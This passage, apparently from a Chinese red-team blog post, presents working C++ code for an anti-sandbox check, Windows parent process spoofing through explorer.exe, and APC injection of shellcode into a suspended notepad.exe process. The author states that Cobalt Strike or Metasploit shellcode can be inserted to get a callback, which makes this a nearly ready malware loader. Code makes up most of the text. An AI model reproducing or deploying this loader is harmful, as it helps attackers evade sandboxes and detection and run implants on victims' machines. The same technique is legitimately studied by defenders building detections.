        return process.th32ProcessID;
    }
    int main() {
        DWORD explorer_id = get_explorer_processid();
        DWORD parent_id = get_parent_processid(GetCurrentProcessId());
        if (explorer_id == parent_id) 
        { /* 判断父进程id是否和explorer进程id相同{ */
            MessageBox(0, L"Not sandbox", L"Success", 0);
        }
        else 
        {
            exit(1);
        }
    }
**实现效果**
在正常情况下运行的话pid是相同的那么弹窗不为沙箱
如果是我直接在vs里面运行一下进行调试就报错直接退出
这里再拿到od里面调试一下可以看到直接终止了
# 父进程伪造
在进行完反沙箱调试之后，我不禁又想，有没有一种方法能够伪造父进程为`explorer.exe`呢，那么上面这种反调试的方法就行不通了。
首先分析一下要伪造父进程肯定要先知道`explorer.exe`的id，再创建进程和线程
`OpenProcess`、`CreateProcess`这几个常用api就不提了，伪造父进程最重要的一个api就是`InitializeProcThreadAttributeList`
**InitializeProcThreadAttributeList**
用于初始化指定的属性列表以创建进程和线程
    BOOL InitializeProcThreadAttributeList(
      LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
      DWORD                        dwAttributeCount,
      DWORD                        dwFlags,
      PSIZE_T                      lpSize
    );
>
>     lpAttributeList
>
> The attribute list. This parameter can be NULL to determine the buffer size
> required to support the specified number of attributes.
>  
>  
>     dwAttributeCount
>
> The count of attributes to be added to the list.
>  
>  
>     dwFlags
>
> This parameter is reserved and must be zero.
>  
>  
>     lpSize
>
> If _lpAttributeList_ is not NULL, this parameter specifies the size in bytes
> of the _lpAttributeList_ buffer on input. On output, this parameter receives
> the size in bytes of the initialized attribute list.
>
> If _lpAttributeList_ is NULL, this parameter receives the required buffer
> size in bytes.
另外还有个重要的结构体`STARTUPINFOEXA`
    typedef struct _STARTUPINFOEXA {
      STARTUPINFOA                 StartupInfo;
      LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
    } STARTUPINFOEXA, *LPSTARTUPINFOEXA;
>
>     StartupInfo
>
> A [STARTUPINFO](https://docs.microsoft.com/en-> us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
> structure.
>  
>  
>     lpAttributeList
>
> An attribute list. This list is created by the
> [InitializeProcThreadAttributeList](https://docs.microsoft.com/en-> us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-> initializeprocthreadattributelist) function.
首先还是要找到explorer.exe的pid
    DWORD getParentProcessID() 
    {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 process = { 0 };
        process.dwSize = sizeof(process);
        if (Process32First(snapshot, &process)) 
        {
            do 
            {
                //If you want to another process as parent change here
                if (!wcscmp(process.szExeFile, L"explorer.exe"))
                    break;
            } while (Process32Next(snapshot, &process));
        }
        CloseHandle(snapshot);
        return process.th32ProcessID;
    }
然后就是父进程伪造的代码，这一块我自己写了一小段尝试，但是写着写着就没思路了，不知道结构该怎么用，还是太菜了，这里跟一下大佬的代码吧
首先`OpenProcess`打开进程，这里调用之前写的`getParentProcessID`获取PID
    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());
然后`ZeroMemory`置空
    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
使用`InitializeProcThreadAttributeList`为线程进程创建初始化指定的属性列表，注意第三个参数保留必须为0
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
`HeapAlloc`在堆里面分配内存，`GetProcessHeap`检索调用进程默认堆的句柄
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
然后更新指令属性
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
创建进程
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", 
                   NULL, 
                   NULL, 
                   NULL, 
                   TRUE, 
                   CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, 
                   NULL, 
                   NULL, 
                   reinterpret_cast(&sInfoEX),
                   &pInfo);
分配内存并写入内存
    //分配内存
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
    SIZE_T* lpNumberOfBytesWritten = 0;
    //写入内存
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);
进行APC调用
    //APC调用
    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
启动线程
    ResumeThread(pInfo.hThread);
完整代码如下，这里shellcode可以用cs的shellcode或者msf的shellcode，生成之后就可以上线
    // Parent spoofing.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
    //
    #include 
    #include 
    #include 
    DWORD getParentProcessID() 
    {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 process = { 0 };
        process.dwSize = sizeof(process);
        if (Process32First(snapshot, &process)) 
        {
            do 
            {
                if (!wcscmp(process.szExeFile, L"explorer.exe"))
                {
                    printf("Find explorer failed!\n");
                    break;
                }
            } while (Process32Next(snapshot, &process));
        }
        CloseHandle(snapshot);
        return process.th32ProcessID;
    }
    int main() 
    {
        unsigned char shellCode[] ="";
        STARTUPINFOEXA sInfoEX;
        PROCESS_INFORMATION pInfo;
        SIZE_T sizeT;
        //打开explorer进程获取当前进程所有权限
        HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); 
        //用0填充数组
        ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA)); 
        //初始化指定的属性列表,创建进程和线程
        InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
        //设置进程属性并从堆中分配内存
        sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); 
        InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
        //更新用于进程和线程创建的属性列表中的指定属性
        UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL); 
        sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        CreateProcessA("C:\\Windows\\System32\\notepad.exe", 
            NULL, 
            NULL, 
            NULL, 
            TRUE, 
            CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, 
            NULL, 
            NULL, 
            reinterpret_cast(&sInfoEX),
            &pInfo);
        //分配内存
        LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
        SIZE_T* lpNumberOfBytesWritten = 0;
        //写入内存
        BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); 
        //APC调用
        QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); 
        //启动线程
        ResumeThread(pInfo.hThread); 
        CloseHandle(pInfo.hThread); 
        return 0;
    }
这里启动的是`notepad.exe`，实现效果如下
欢迎关注公众号 **红队蓝军**